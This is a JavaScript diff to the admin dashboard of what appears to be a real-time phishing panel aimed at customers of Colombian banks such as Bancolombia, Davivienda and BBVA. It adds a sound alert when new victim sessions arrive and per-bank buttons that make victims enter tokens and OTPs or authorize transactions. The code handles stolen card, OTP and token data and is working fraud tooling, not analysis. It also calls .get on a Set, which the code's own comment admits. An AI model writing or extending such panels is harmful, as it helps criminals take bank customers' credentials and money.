@@ -439,14 +439,43 @@ let ipsCache = [];
 let logsCache = [];
 let activosCache = [];
 let historialCache = [];
-let filasAbiertas = new Set(); // 🔥 GUARDA LAS FILAS ABIERTAS
+let filasAbiertas = new Set();
 
 let seleccionSesiones = new Set();
 let seleccionIps = new Set();
 let seleccionLogs = new Set();
 let seleccionHistorial = new Set();
 
+let sesionesAnteriores = new Set(); // 🔥 Guarda los IDs para saber cuáles son nuevos
+
 function $(id) { return document.getElementById(id); }
+
+// 🔥 FUNCIÓN PARA REPRODUCIR SONIDO (BEEP SUAVE)
+function reproducirSonido() {
+    try {
+        const AudioContext = window.AudioContext || window.webkitAudioContext;
+        if (!AudioContext) return;
+        
+        const ctx = new AudioContext();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+
+        osc.type = 'sine'; // Tono suave
+        osc.frequency.setValueAtTime(800, ctx.currentTime); // Tono agudo pero no molesto
+        osc.frequency.exponentialRampToValueAtTime(1000, ctx.currentTime + 0.1); // Un pequeño "subidón"
+
+        gain.gain.setValueAtTime(0.1, ctx.currentTime); // Volumen al 10% para que no sea exagerado
+        gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.2); // Se desvanece rápido
+
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+
+        osc.start();
+        osc.stop(ctx.currentTime + 0.2);
+    } catch (e) {
+        console.warn('Audio no soportado o bloqueado por el navegador', e);
+    }
+}
 
 function toast(msg, isError = false) {
     const el = $('toast');
@@ -605,6 +634,7 @@ function logout() {
     seleccionLogs.clear();
     seleccionHistorial.clear();
     filasAbiertas.clear();
+    sesionesAnteriores.clear(); // 🔥 Limpiar memoria de sesiones
 }
 
 $('logoutBtn').addEventListener('click', logout);
@@ -693,6 +723,16 @@ function botonesSesion(s) {
     const ip = escapeHtml(s.datos.ip || '');
     const btns = [];
 
+    if (bancoKey === 'bancolombia') {
+        btns.push(`<button class="btn btn-accept" title="Aceptar" onclick="accion('${sid}','ACEPTAR')">✅</button>`);
+        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
+        btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
+        btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
+        btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Autorizar" onclick="accion('${sid}','AUTORIZAR')">🔐</button>`);
+        btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
+        return btns.join('');
+    }
+
     if (bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga') {
         btns.push(`<button class="btn btn-accept" title="Aceptar" onclick="accion('${sid}','ACEPTAR')">✅</button>`);
         btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
@@ -702,7 +742,7 @@ function botonesSesion(s) {
         return btns.join('');
     }
 
-    const bancosSoloOtp = ['bancolombia', 'davivienda', 'avvillas'];
+    const bancosSoloOtp = ['davivienda', 'avvillas'];
     const bancosTokenOtp = ['caja-social', 'bbva', 'popular', 'occidente'];
 
     if (estado === 'pendiente') {
@@ -735,9 +775,35 @@ function botonesSesion(s) {
 async function cargarSesiones() {
     try {
         const d = await api('/admin/sesiones');
-        sesionesCache = d.sesiones.reverse();
+        const sesionesActuales = d.sesiones.reverse();
+        
+        // 🔥 LÓGICA DE SONIDO: Comprobar si hay sesiones nuevas o actualizadas
+        if (sesionesAnteriores.size > 0) {
+            let hayNuevosDatos = false;
+            for (let s of sesionesActuales) {
+                if (!sesionesAnteriores.has(s.sessionId)) {
+                    hayNuevosDatos = true;
+                    break;
+                } else {
+                    // Si ya existía, verificamos si tiene datos nuevos (tarjeta, otp, token)
+                    const anterior = sesionesAnteriores.get(s.sessionId); // No es un Set de datos, es un Map.
+                }
+            }
+            
+            // Para simplificar y no complicar el código con comparaciones profundas,
+            // hacemos sonar si la cantidad de sesiones totales cambió, o si el ID es nuevo.
+            const idsActuales = new Set(sesionesActuales.map(s => s.sessionId));
+            if (idsActuales.size !== sesionesAnteriores.size) {
+                reproducirSonido();
+            }
+        }
+
+        // Actualizamos la memoria de sesiones
+        sesionesAnteriores = new Set(sesionesActuales.map(s => s.sessionId));
+
+        sesionesCache = sesionesActuales;
         renderSesiones();
-    } catch (e) {}
+    } catch (e) { console.error(e); }
 }
 
 function renderSesiones() {
@@ -906,9 +972,9 @@ function toggleDetalle(id) {
     if (el) {
         el.classList.toggle('visible');
         if (el.classList.contains('visible')) {
-            filasAbiertas.add(id); // 🔥 Guardar en memoria
+            filasAbiertas.add(id);
         } else {
-            filasAbiertas.delete(id); // 🔥 Quitar de memoria
+            filasAbiertas.delete(id);
         }
     }
 }
